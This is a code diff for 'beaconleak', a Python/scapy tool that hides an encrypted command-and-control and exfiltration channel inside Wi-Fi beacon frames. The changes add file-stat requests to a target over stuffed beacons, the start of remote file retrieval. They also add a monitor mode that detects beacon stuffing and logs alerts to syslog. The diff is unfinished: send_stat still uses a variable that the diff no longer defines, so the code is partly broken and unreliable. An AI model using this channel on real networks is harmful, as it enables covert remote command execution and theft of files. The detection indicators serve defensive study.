@@ -7,7 +7,7 @@ banner = """
 | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
 | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
 |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                        by cjcase [v0.8.90]\n
+                        by cjcase [v0.9.0]\n
 """
 
 import os
@@ -60,8 +60,11 @@ class beaconleak():
             '!': 'send command to target without waiting for response (e.g. !ls)',
             '!end': 'exit beaconshell',
         }
-        # science
+        # detection science
         self.detected = 0
+        if self.mode == "mon":
+            syslog.openlog(logoption=syslog.LOG_PID, facility=syslog.LOG_SYSLOG)
+            self.syslog_level = syslog.LOG_ALERT
         # user set
         self.debug = debug
         # crypto magic
@@ -84,6 +87,7 @@ class beaconleak():
         # TODO download flow
         self.max_size = 355
         self.leak_frame = None
+        self.recv = dict(chunks = 0, size = 0, tally = None, tmp = None, tick = None, last = 3)
 
 
     def cmd(self, cmd):
@@ -210,10 +214,19 @@ class beaconleak():
             print(f"\t[*] Checking for file \"{src}\" stats in target")
         req = self.beacon_craft(src.encode(), 222)
         sendp(req, iface=self.iface, inter=0.100, verbose=int(self.debug))
+        # get response
+        sniff(iface=self.iface, stop_filter=self.response, timeout=self.delay, monitor=True)
+        if not self.recv['tmp']:
+            print(f"[e] No response from target in {self.delay} seconds")
+            return False
+        msg = self.box.decrypt(self.recv['tmp'])
+        s_msg = msg.split(b':')
+        f_size = int(s_msg[0])
+        chunks = int(s_msg[1])
+        print(f"\t[i] file size: {f_size}, total chunks: {chunks}, listening...")
+        # TODO
         # listen for chunks
         # check missing
-        # ???
-        # profit!
 
 
     def response(self, frame):
@@ -232,6 +245,9 @@ class beaconleak():
                         msg = self.dec_payload(elements.info)
                         print(msg)
                         break
+                    if elements.ID == 223: # file stat response
+                        self.recv['tmp'] = elements.info
+                        return True
                     i = i + 1
                     elements = elements.payload
   
@@ -300,17 +316,17 @@ class beaconleak():
             i = 0
             elements = frame
             while elements:
-                if elements.ID == 128: # ignore self
+                if elements.ID == 128: # TODO uhmm wat
                     break
                 if elements.ID == 222: # stat request
-                    self.cut_frame(frame, i)
-                    self.send_stat(elements.info)
+                    self.send_stat(elements.info, frame, i)
+                    break
                 if elements.ID == 224: # chunk request
                     self.cut_frame(frame, i)
                     self.do_chunk_magic(elements)
                     break
                 if elements.ID == 254:
-                    # TODO let do_magic ude the new frame cutting for response
+                    # TODO let do_magic use the new frame cutting for response
                     self.do_magic(frame, i)
                     break
                 i = i + 1
@@ -390,35 +406,45 @@ class beaconleak():
     def detect(self, frame):
         if frame.haslayer(Dot11Beacon):
             ssid = frame.info.decode('utf-8')
+            bssid = frame.addr2
+            channel = int(ord(frame[Dot11Elt:3].info))
             elements = frame.getlayer(Dot11Elt)
             # TODO add MAC Adress validation detection case            
             # IoC: pyExfil defaults
             if frame.addr2 == "00:00:00:00:00:42" or ssid == "pyExfil":
-                print("[!] Beacon Stuffing Detected! (SSID:{}, PyExfil Defaults)".format(ssid))
-                self.detected += 1
+                msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [PyExfil defaults]"
+                self.mon_log(msg)
                 return
             # IoC: beaconLeak defaults
             if frame.addr2 == "00:14:bf:de:ad:c0":
-                print("[!] Beacon Stuffing Detected! (SSID:{}, beaconLeak Defaults)".format(ssid))
-                self.detected += 1
+                msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [beaconLeak defaults]"
+                self.mon_log(msg)
                 return
             # IoC: Beacon size sample std. dev.
             l_tresh = 174 # these numbers were made with 
             h_tresh = 352 # SCIENCE!
             l_frame = len(frame)
-            if l_frame < l_tresh or l_frame > h_tresh:
-                print("[!] Beacon Stuffing Detected! (SSID:{}, Beacon Size Treshold)".format(ssid))
-                self.detected += 1
+            if l_frame > h_tresh:
+                msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [Beacon Size Treshold]"
+                self.mon_log(msg)
                 return
             while elements:
                 # IoC: Reserved Elements
                 if elements.ID in self.reserved:
-                    # TODO: implement syslog functionality for IoCs
-                    print("[!] Beacon Stuffing Detected! (SSID:{} Reserved Element {})".format(ssid, elements.ID))
-                    self.detected += 1
-                    if self.debug:
-                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
+                    msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [Reserved Element {elements.ID}]"
+                    self.mon_log(msg)                    
                 elements = elements.payload.getlayer(Dot11Elt)
+
+    def mon_log(self, msg):
+        if self.debug:
+            print(msg)
+            self.detected += 1
+        if sys.platform == "linux":
+            syslog.syslog(self.syslog_level, msg)
+        else:
+            now = time.strftime("%d.%m.%y %H:%M:%S UTC%z")
+            print(f"<{self.syslog_level}> {now} [beaconleak]: {msg}")
+        
 
 
     def check_iface(self):
@@ -468,8 +494,7 @@ class beaconleak():
         return (s_size, chunks, r_size)
 
 
-    def send_stat(self, filename_c):
-        t_frame = self.leak_frame 
+    def send_stat(self, filename_c, frame, cut):
         filename = self.box.decrypt(filename_c)
         if self.debug:
             print(f"[d] stat request for file: {filename.decode('utf-8')}")
@@ -480,7 +505,10 @@ class beaconleak():
         payload_c = self.box.encrypt(payload)
         _payload = Dot11Elt(ID=223, info=payload_c, len=len(payload_c))
         tmp_frame = t_frame / _payload
-        sendp(tmp_frame, iface=self.iface, verbose=int(self.debug), realtime=True)
+        if self.debug:
+            print(f"[d] stuffed:\n{tmp_frame.command()}")
+        time.sleep(1)
+        sendp(tmp_frame, iface=self.iface, verbose=int(self.debug))
 
 
     # niiice
